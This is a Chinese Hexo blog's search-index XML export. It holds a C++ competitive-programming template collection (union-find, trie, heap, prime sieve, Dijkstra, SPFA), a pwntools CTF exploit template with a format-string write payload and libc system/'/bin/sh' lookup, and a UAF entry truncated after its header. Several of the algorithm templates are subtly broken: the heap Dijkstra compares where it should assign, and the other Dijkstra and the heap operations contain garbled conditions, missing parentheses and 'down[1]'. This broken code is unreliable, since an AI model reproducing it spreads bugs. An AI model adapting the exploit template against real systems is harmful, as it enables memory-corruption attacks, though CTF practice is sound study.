<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>算法模板大全</title>
    <link href="/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/"/>
    <url>/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<hr><p>一、基本数据结构<br>1.并查集<br> （1）作用 将两个集合合并，询问两个数据是否在一个集合当中；<br> （2）模版<br> &#x2F;&#x2F;朴素版模版</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function">  </span>&#123; <br>      <span class="hljs-keyword">if</span>(p[x]!=x) p[x]=<span class="hljs-built_in">find</span>(p[x]);<br>      <span class="hljs-keyword">return</span> p[x];<br>  &#125;<br> <span class="hljs-comment">//带权重边并查集</span><br> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span>(p[x]!=x)<br>     &#123;<br>         <span class="hljs-type">int</span> temp=<span class="hljs-built_in">find</span>(p[x]);<br>         d[x]+=d[p[x]];<br>         p[x]=temp;<br>     &#125;<br>     <span class="hljs-keyword">return</span> p[x];<br> &#125;<br></code></pre></td></tr></table></figure><p>2.单调队列<br>  充分利用单调性来解决类似单调栈、求滑动窗口里面的最大值、最小值的问题<br>可以先去暴力枚举，然后思考该题的性质，结合单调性和栈的性质来进行优化<br>需要思考清楚，什么时候队首出去，什么时候弹出队尾元素，以及当前的队列里面存储的值是序号还是当前值，这是非常重要的<br>对于普通队列来讲，可以用数组模拟队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//hh 表示队头，tt表示队尾</span><br>   <span class="hljs-type">int</span> q[N],hh=<span class="hljs-number">0</span>,tt=<span class="hljs-number">-1</span>;<br>   <span class="hljs-comment">//向队尾插入一个数</span><br>   q[++tt]=x;<br>   <span class="hljs-comment">//从队头弹出一个元素</span><br>   hh++；<br>   <span class="hljs-comment">//队头取值</span><br>   q[hh];<br>   <span class="hljs-comment">//如果hh&lt;=tt,则表示档当前队列不为空</span><br></code></pre></td></tr></table></figure><p>3.trie树<br>用来快速存储来查找字符串集合的数据结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> son[N][<span class="hljs-number">26</span>],cnt[N],idx;<br><span class="hljs-comment">// 0号点即是根节点，又是空节点</span><br><span class="hljs-comment">//son[][]存储树中每个节点的子节点</span><br><span class="hljs-comment">//cnt[]存储以每个节点结尾的单词数量</span><br><br><span class="hljs-comment">//插入一个字符串</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;str[i];i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u=str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!son[p][u]) son[p][u]=++idx;<br>        p=son[p][u];<br>    &#125;<br>    cnt[p]++;<br>&#125;<br><span class="hljs-comment">//查询字符串出现的次数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;str[i];i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u=str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        p=son[p][u];<br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];<br>&#125;<br></code></pre></td></tr></table></figure><p>x，右儿子是2*x+1；<br>（2）</p><p>堆所支持的操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">（<span class="hljs-number">1</span>）插入一个数 <br>    heap[++size]=x;<span class="hljs-built_in">up</span>(size);<br>（<span class="hljs-number">2</span>）求集合当中的最小值<br>    heap[<span class="hljs-number">1</span>];<br>（<span class="hljs-number">3</span>）删除最小值<br>    heap[<span class="hljs-number">1</span>]=heap[size];size--; down[<span class="hljs-number">1</span>]<br>（<span class="hljs-number">4</span>）删除任意一个元素<span class="hljs-comment">//stl中的堆（优先队列）不可以直接实现</span><br>    heap[k]=heap[size];size--;<span class="hljs-built_in">down</span>(k),<span class="hljs-built_in">up</span>(k);<br>（<span class="hljs-number">5</span>）修改任意一个元素<span class="hljs-comment">//stl中的堆不可以直接实现</span><br>    heap[k]=x,<span class="hljs-built_in">down</span>(k),<span class="hljs-built_in">up</span>(k);<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1</span><br><span class="hljs-type">int</span> h[N], ph[N], hp[N], size;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t = u;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> &lt;= cnt &amp;&amp; h[u * <span class="hljs-number">2</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span> &lt;= cnt &amp;&amp; h[u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (u != t)<br>    &#123;<br>        <span class="hljs-built_in">swap</span>(h[u], h[t]);<br>        <span class="hljs-built_in">down</span>(t);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F; O(n)建堆</p><blockquote><p>for (int i &#x3D; n &#x2F; 2; i; i – ) down(i);</p></blockquote><p>二、数论<br>1、筛质数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">int</span> primes[N],cnt;<br>  <span class="hljs-type">bool</span> st[N];<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_primes</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>      &#123;<br>          <span class="hljs-keyword">if</span>(!st[i]) primes[cnt++]=i;<br>          <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;primes[j]&lt;=n/i;j++)<br>          &#123;<br>              st[primes[j]*i]=<span class="hljs-literal">true</span>;<br>              <span class="hljs-keyword">if</span>(i%primes[j]==<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>          &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>2、最大公约数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> b?<span class="hljs-built_in">gcd</span>(b,a%b):a;<br>&#125;<br><span class="hljs-number">3</span>、快速幂<br><span class="hljs-function">LL <span class="hljs-title">qmi</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    LL res = <span class="hljs-number">1</span> % p;<br>    <span class="hljs-keyword">while</span> (b)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (b &amp; <span class="hljs-number">1</span>) res = res * a % p;<br>        a = a * (LL)a % p;<br>        b &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>三、图论<br>1.拓扑排序（图的宽度优先遍历的应用）<br>***有向图才会有拓扑序列<br>时间复杂度O(n+m)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">topsort</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> hh=<span class="hljs-number">0</span>,tt=<span class="hljs-number">-1</span>;<br>    <span class="hljs-comment">//d[i]存储点i的入度</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(d[i]==<span class="hljs-number">0</span>)<br>        &#123;<br>            q[++tt]=i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(hh&lt;=tt)<br>    &#123;<br>        <span class="hljs-type">int</span> t=q[hh++];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=h[t];i!=<span class="hljs-number">-1</span>;i=ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j=e[i];<br>            <span class="hljs-keyword">if</span>(--d[j]==<span class="hljs-number">0</span>)<br>            &#123;<br>                q[++tt]=j<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> tt==n<span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>2、朴素dijkstra求最短路<br>int g[N][N];&#x2F;&#x2F;存储每条边<br>int dist [N];&#x2F;&#x2F;存储1号点到每个点的最短位置<br>bool st[N];存储每个节点的最短路径是否已经确定</p><p>int dijkstra()<br>{<br>    memset(dist,0x3f,sizeof dist);<br>    dist[1]&#x3D;0;</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-1</span>;i++)<br>&#123;<br>    <span class="hljs-type">int</span> t=<span class="hljs-number">-1</span>;<span class="hljs-comment">//在为确定最短路中的点中，寻找距离最短的点</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!st[j] &amp;&amp;<span class="hljs-built_in">n</span>(t==<span class="hljs-number">-1</span> || dist[t]&gt;dist[j])<br>        &#123;<br>            t=j;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//用t更新其他点的距离</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>    &#123;<br>        dist[j]=<span class="hljs-built_in">min</span>(dist[j],dist[t]+g[t][j]);<br>    &#125;<br>    st[t]=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> dist[n];<br></code></pre></td></tr></table></figure><p>}<br>3.堆优化版dijkstra()</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;PII;<br><span class="hljs-type">int</span> n;<span class="hljs-comment">//点的数量</span><br><span class="hljs-type">int</span> h[N],w[N],e[N],ne[N],idx;邻接表存储所有边<br><span class="hljs-type">int</span> dist[N];<span class="hljs-comment">//存储所有点到1号点的距离</span><br><span class="hljs-type">bool</span> st[N];<span class="hljs-comment">//存储每个点的最短距离是否确定</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstar</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    priority_queue&lt;PII,vector&lt;PII&gt;,greater&lt;PII&gt;&gt;heap;<br>    heap.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">while</span>(heap.<span class="hljs-built_in">size</span>()<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t=heap.<span class="hljs-built_in">top</span>();<br>        heap.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> ver=t.second,distance =t.first;<br>        <span class="hljs-keyword">if</span>(st[ver]) <span class="hljs-keyword">continue</span>;<br>        st[ver]=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[ver];i!=<span class="hljs-number">-1</span>;i=ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j=e[i];<br>            <span class="hljs-keyword">if</span>(dist[j]&gt;distance+w[i])<br>            &#123;<br>                dist[j]&gt;distance+w[i];<br>                heap.<span class="hljs-built_in">push</span>(&#123;dist[j],j&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>4.spfa求最短路</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pf">int h[N],e[N],ne[N],w[N],idx;<br>bool <span class="hljs-keyword">state</span>[N];<br>int dist[N];<br>void spfa()<br>&#123;<br>    memset(dist,<span class="hljs-number">0</span>x3f,sizeof dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">state</span>[<span class="hljs-number">1</span>]=true;<br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-keyword">queue</span><span class="hljs-variable">&lt;int&gt;</span>q;<br>q.push(<span class="hljs-number">1</span>);<br>while(q.size())<br>&#123;<br>    int t=q.front();<br>    q.pop();<br>    <span class="hljs-keyword">state</span>[t]=false;<br>    <span class="hljs-keyword">for</span>(int i=h[t];i!=-<span class="hljs-number">1</span>;i=ne[i])<br>    &#123;<br>        int j=e[i];<br>        if(dist[j]&gt;dist[t]+w[i])<br>        &#123;<br>            dist[j]=dist[t]+w[i];<br>            if(!<span class="hljs-keyword">state</span>[j])<br>            &#123;<br>                q.push(j);<br>                <span class="hljs-keyword">state</span>[j]=true;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>}<br>  spfa判断负环</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> n;      <span class="hljs-comment">// 总点数</span><br><span class="hljs-type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-type">int</span> dist[N], cnt[N];        <span class="hljs-comment">// dist[x]存储1号点到x的最短距离，cnt[x]存储1到x的最短路中经过的点数</span><br><span class="hljs-type">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否在队列中</span><br><br><span class="hljs-comment">// 如果存在负环，则返回true，否则返回false。</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 不需要初始化dist数组</span><br>    <span class="hljs-comment">// 原理：如果某条最短路径上有n个点（除了自己），那么加上自己之后一共有n+1个点，由抽屉原理一定有两个点相同，所以存在环。</span><br><br>queue&lt;<span class="hljs-type">int</span>&gt; q;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    q.<span class="hljs-built_in">push</span>(i);<br>    st[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">while</span> (q.<span class="hljs-built_in">size</span>())<br>&#123;<br>    <span class="hljs-keyword">auto</span> t = q.<span class="hljs-built_in">front</span>();<br>    q.<span class="hljs-built_in">pop</span>();<br><br>st[t] = <span class="hljs-literal">false</span>;<br>    <br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-type">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>        &#123;<br>            dist[j] = dist[t] + w[i];<br>            cnt[j] = cnt[t] + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (cnt[j] &gt;= n) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;       <span class="hljs-comment">// 如果从1号点到x的最短路中包含至少n个点（不包括自己），则说明存在环</span><br>            <span class="hljs-keyword">if</span> (!st[j])<br>            &#123;<br>                q.<span class="hljs-built_in">push</span>(j);<br>                st[j] = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EXP模板</title>
    <link href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<p>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">c = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span>(c):<br>        gdb.attach(p, c)<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(p)<br>        pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>() : <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><span class="hljs-comment">#-----------------------------------------------------------------------------------------</span><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sa  = <span class="hljs-keyword">lambda</span> text,data  :p.sendafter(text, data)<br>sl  = <span class="hljs-keyword">lambda</span> data   :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> text,data  :p.sendlineafter(text, data)<br>r   = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>   :p.recv(num)<br>rl  = <span class="hljs-keyword">lambda</span> text   :p.recvuntil(text)<br>pr = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span> :<span class="hljs-built_in">print</span>(p.recv(num))<br>inter   = <span class="hljs-keyword">lambda</span>        :p.interactive()<br>l32 = <span class="hljs-keyword">lambda</span>    :u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>l64 = <span class="hljs-keyword">lambda</span>    :u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu32    = <span class="hljs-keyword">lambda</span>    :u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>    :u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>int16   = <span class="hljs-keyword">lambda</span> data   :<span class="hljs-built_in">int</span>(data,<span class="hljs-number">16</span>)<br>lg= <span class="hljs-keyword">lambda</span> s, num   :p.success(<span class="hljs-string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))<br><span class="hljs-comment">#-----------------------------------------------------------------------------------------</span><br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./easystack&#x27;</span>)<br><span class="hljs-comment">#p = remote(&#x27;node3.anna.nssctf.cn&#x27;, 28976)</span><br><span class="hljs-comment">#elf = ELF(&#x27;./pwn&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>gdb.attach(p, <span class="hljs-string">&#x27;b *0x4014d2&#x27;</span>)<br><br>sa(<span class="hljs-string">b&#x27;input: &#x27;</span>, <span class="hljs-string">b&#x27;%4660c%7$n&#x27;</span>)<br><br><br>pause()<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>UAF</title>
    <link href="/2023/07/24/UAF/"/>
    <url>/2023/07/24/UAF/</url>
    
